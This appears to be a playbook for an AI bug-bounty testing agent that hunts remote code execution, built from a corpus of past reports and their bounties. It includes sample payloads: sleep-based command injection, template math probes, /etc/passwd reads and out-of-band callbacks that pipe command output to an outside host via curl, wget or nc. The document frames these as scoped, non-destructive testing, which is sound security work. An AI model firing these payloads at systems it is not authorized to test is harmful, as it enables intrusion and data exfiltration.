---
title: "RCE Testing Agent Playbook — the executable protocol"
type: agent-playbook
category: rce-all
cwe: "CWE-78, CWE-94, CWE-502"
built: "2026-11-05"
corpus: "150 mirror rows → 134 bodies read (125 resolved / 3 informative / 3 duplicate / 3 not-applicable) · 16×404 recorded"
bounty: "$270,868 roster-tagged (JSON $73,187/32 · list $157,947/63 · dead-list $39,734/12) · pure class 01–07 $231,044/93 · adjacent+noise 08 $90/2 · DoD 09 $0"
companion_modules: "01 os-command-injection · 02 template-injection-app-primitives · 03 unsafe-deserialization · 04 memory-corruption-execution · 05 desktop-loadpath · 06 devops-console-exposure · 07 chains-from-other-classes · 08 adjacent-noise · 09 dod-corpus-meta"
quote_rule: "byte-true, from read bodies only; 404 rows recorded never quoted"
---

# RCE Testing Agent Playbook

Executable protocol derived from 134 read bodies (2013-2017 era) + modern discipline from
the hunt-rce / hunt-api-misconfig / hunt-cicd skills. Every step cites corpus evidence.
Run phases in order; abort at kill-gates. Crown-jewel doctrine up front: **payouts track
what the flaw reaches** — module 04's sandbox RIP-control rows paid $18,000-$20,000
because a sandbox exists to make that impossible, module 02's Uber SSTI paid $10,000
because the engine evaluated attacker expressions in a mail render, while the *same
class unchained* (pattern PoCs, module-08 noise) paid $0. The vault's biggest single
premium: the execution primitive that needs no bug chaining (exposed consoles, module 06,
priced $300-$15,000 in five years' spread).

## P0 — Program classification & policy read (before any payload)

1. Program type: commercial bug bounty vs VDP vs language program (PHP/Python/Ruby/
   Perl/ibb rows are modules 03/04's paid corpus — VDP prices $500-$3,000 per engine bug
   flat; module 04 crash-batch rows paid $100-$800 flat). The corpus rows are almost all
   `resolved` (125/134) — the class pays resolutions, but **a resolved-critical row with
   no body (module 09, fifteen DoD rows, $0)** proves resolution metadata carries neither
   bounty nor class. Read policy for allowed commands now: Jobert's guide tag
   "harmless commands" (`sleep`, `id`, `hostname`, `whoami`) is the module-01 floor, and
   era programs allowed `$(`sleep 20`)`-class payloads only — find your program's
   modern equivalent (usually "non-destructive, no lateral movement").
2. Environment signal: classify the fleet — SaaS/server targets vs the device lane of
   module 01 (the AirOS/Ubiquiti cluster, 4 rows, $1,300-$2,750 — *device* consoles
   monetized command injection at full tier). Ubiquiti-era tangent: the dl-fw.cgi class-identifier "user
   text inside a double-quoted shell string" is the inventory template.
3. Kill-gate: no testing yet — P0 produces the *policy envelope* only.

## P1 — Surface inventory (argument positions, engines, sinks)

1. **Argument positions** — everything that becomes a shell argument (URL params, header
   values, filename stems, channel names). Corpus evidence: imgur needs one numeric GET
   parameter (`y`) for $5,000 (module 01 §3); IRCCloud needs only a *channel-name* string
   ($300 — module 01 §5); Rails' Web Console needed only `X-Forwarded-For: 0000::1`
   (module 02 §5). Add CLI tools invoked server-side from parameter names
   (`gm convert`, `gzip -5`, `wget -O`, `ping -c 4`, `zip`).
2. **Engines** — template engines actually in the stack (module 02): Jinja2/Smarty/Liquid
   fingerprints ship in the normal attack flow (`{$smarty.version}`, `{{7*7}}` math
   probes plus render-context witness — in 125980 the witness was *another user's*
   profile email).
3. **Deserializers** — session stores (PHP session deserializer module 03; Rails
   CookieStore), form-encoded blobs, plugin states, job queues' payload class (module 07
   §4), language-native interpreters (`mruby-engine`, module 04).
4. **Consoles & pipelines** — mount points of module 06: exposed panels, build servers,
   CI scripts, install scripts (module 07 §6).
5. Devices/desktops — module 05's local-prerequisite surfaces for anything shipped to
   users (client apps, agents) — inventory their load-paths (Procmon-style on Windows).
6. Out-list: ImageTragick-family CVEs in *decoder* versions are version-fingerprinting,
   not payload guesses — record version from app disclosure, not from the bug.

## P2 — Probe protocol (from cheapest signal to hardest)

Per candidate sink, in era-chronological order of corpus evidence, with pricing attached:

1. **Math probe** `{{7*7}}`/`{7*7}` (module 02) — witness the render context; if the
   render is in email/another user's page, the payload subject is the *display surface*,
   not the submit surface.
2. **Timing oracle** — zseano's tip: `sleep`-family payload in every parameter,
   monitor response deltas; Jobert's discipline: baseline first, exact delta
   ("~3 s → ~8 s is an increase of exactly 5 seconds"), repeat to eliminate false
   positives (blogs-index §1b). Evidence: RCE-73567's `$(sleep 20)` → "around 20
   seconds" → $3,000 (module 01 §2).
3. **OOB callback** — `wget`/`curl` back to your server carrying command output
   (`ps aux|curl ... -d @-` geometry from RCE-212696, $5,000; `hostname | nc` from the
   Jobert guide; `$(wget sandbox.../$(id))` build logs from RCE-73567). The 2015-2017
   era's *deliverable* format: name the command, show the callback, print the captured
   output.
4. **Boolean oracle for blind cases** (module 03 §3): have a command that returns
   different errors for found/not-found — RCE-153026's `cmd.exe` vs `fakefile.exe`
   "The system cannot find the file specified" differential read from the response.
5. **Second-order delivery** — the module-01 §4 lesson (RCE-214022, $512): if your
   *legitimate* write path strips payloads but a side admin path does not, your shell is
   the *stored string's* transport, meaning: track every writer to the sink-touched
   table/field.
6. **Language-level lattice** — module 03/04 tier: engine crash craft (the mruby corpus ran
   hand-written one-liner PoCs — afl-fuzz credited at 221251 — 18 crash reports, flat $100-$800),
   decode archive formats (phar 6 rows), and sandbox RIP-control (module 04's crown
   rows 181321/181879/183356: $20,000/$18,000/$10,000).
7. Skeleton quote (module 02 — the honest self-limit): "I think it can be a Remote Code
   Execution vulnerability but there is a length limit" priced $10,000 — showing you
   stopped at the boundary is what era-triage rewarded.

## P3 — Proof ladder (the modest demonstrations paid)

1. Module 01's POC ladder: identity → file-read of a *public* file → callback with the
   body (`id`, `hostname`, `whoami`) — never `rm`, never lateral movement.
2. Module 02's file-read progressions: `file_get_contents('/etc/passwd'...)` with
   `var_dump` (Smarty row) is the *full* demonstration expected at $400 tier.
3. Module 03's endgame: the marshalling ladder — `secret_key_base` proof + a single
   `id` output (134321). When egress is filtered, the module-03 Java lane needs no
   exfiltration at all (153026's boolean differential) — a differential plus one
   callback was the era's best-accepted bundle.
4. Module 04's crown-jewel format (RIP-control in sandboxes): one signature jump address
   (`0x0000133713371337`) — no shell needed at the $18k tier.
5. Pipeline/queue demonstrations: module 07 §4 shows the *bare touch* proof
   (`instance_eval` invoking ``touch /tmp/rce-demo``) — the evaluation marker is the
   proof-of-principle; do not persist.
6. Module 06 (console exposure): proof = screenshot of the panel + the policy-mandated
   level of post-auth demonstration ONLY IF the program layout allows — the $15k row's
   era paid for exposure alone.

## P4 — Modern hardening fingerprints (never corpus doctrine)

The 2017-era findings map to these modern *expectations*; a corpus-identical trigger on
a modern stack usually means the hardening is absent, not that the class is dead:

- **Command injection**: shell-arg construction via arrays/exec-arg-list vs string
  interpolation; `escapeshellarg` (module-08's 226896 rejection shows the checker's
  eye) vs `escapeshellcmd` (imgur's unescaped space row). Device console classes still
  persist into 2020s firmware (BBH §2.1's NETGEAR/Fortinet-era bibliography).
- **Template engines**: Jinja2 `SandboxedEnvironment`/autoescape config, Liquid
  (module 02 §4) is today's named sandbox — the "Limited RCE" row is the modern posture
  named no-args boundary.
- **Deserialization**: PHP `allowed_classes: []`, Rails secret rotation env plumbing,
  Java deserialized-object firewalls (Jackson allow-lists / blocklists; the 2017
  blacklist-era ysoserial graveyard is the modern before-state); YAML safe-load semantics(
  module 03 §4's `!php/object` bridge).
- **Consoles**: unauth panels gone everywhere (module 06's $300-era rows are the
  before-state — config drift now lands as auto-P1 findings); CI scripts now carry
  integrity checks (module 07 §6's HTTP-bin lane became supply-chain-signing doctrine).
- **Memory**: interpreter VDPs pay flat rates for crashes (module 04's crash corpus is
  the historical price list for today's language-program tables; sandboxes price
  RIP-control higher than DoS crashes.
- **Client/desktop**: allow-listed update channels — module 05's `C:\usr\local\ssl` row
  is the modern Electron/Node/loader hardening target.

## P5 — Pre-report gates (kill-gates)

1. **Class gate** — you can name the execution primitive (shell / engine eval /
   unmarshal / memory / console) and its *reach boundary*. A payload that never fires
   — a bare claim — dies here (module 09: fifteen resolved-critical
   DoD rows, $0; module 08's 218342 junk row).
2. **Identity gate** — you demonstrated *execution*, not hallucination: a timestamped
   output, callback log, or register dump. Title-only rows (module 06's three
   metadata-only entries) get *attributed* to their modules but are never cited as
   proof in any report you write — their lesson is pricing only.
3. **Boundary gate** — the modern equivalent of module 02 §7's length-limit honesty:
   state what you could not reach. Sandbox-bounded expressions are a *finding* — cite
   module 02. Claims of "maybe" (module 08's theory rows) die here.
4. **Version/patch gate** — outdated-CVE claims need your own demo or die (module 08's
   168485 got $50 in 2016; cannot pass a 2020s triage).
5. **Prereq gate** — state what auth context the finding needs: the device-lane rows
   (module 01's read-only-user privilege) and the local-user rows (module 05) were honest
   about reach; module 07's queue-trust row died at triage specifically for its
   unreached prerequisite (informative, $0). The language-VDP crash-batch era paid
   regardless of exploitability (module 04) — modern programs price the *context*,
   so context must be written.
6. **Noise gate** — the "it's not RCE"-check against module 08's gallery: content
   spoofing mislabeled as command injection, policy complaints, jokes, plugin CVE dumps
   with no exploit. The mirror carries 5499 ("Arbitrary command execution in MS-DOS",
   resolved) — the noise floor exists at every program.

## Module ↔ phase table

| Phase | Corpus evidence (modules) | Anatomy of the paid pattern |
|---|---|---|
| P1 inventories argument positions | 01 (§2-§7) | imgur `y` param / IRC channel / device URLs |
| P2 probes timing + OOB + oracle | 01 §2-§3, 03 §3, 07 §4 | `$(sleep 20)` → log; error-differential; touch-marker |
| P3 proofs ladder, honest boundaries | 02 (§2-§5), 04 (§2-§3) | engine probe chains; RIP jumps; boundary note |
| P4 hardening fingerprints | 01 (§7), 02 §7, 04 §8, 05 §4, 06 §5, 07 §8 | escapeshellarg vs cmd; sandboxes; console drift |
| P5 kill-gates | 08 (§2-§4), 09 (§2-§4) | theory/claim/identity/noise exhibits |

## Non-goals

- Webshell deployment chains: absent from the mirror (source-index §1 verified) — outside
  this vault's corpus claims, treated bibliographically only.
- Deserialization gadget *catalogs* beyond the corpus's own Java lane — modern ysoserial-
  derived gadgets are bibliography (blogs-index §3), never doctrine.
- Memory-corruption exploitation beyond interpreter targets: the corpus pays crash + RIP
  evidence; kernel/heap-feng-shui beyond that is outside every module's claims.
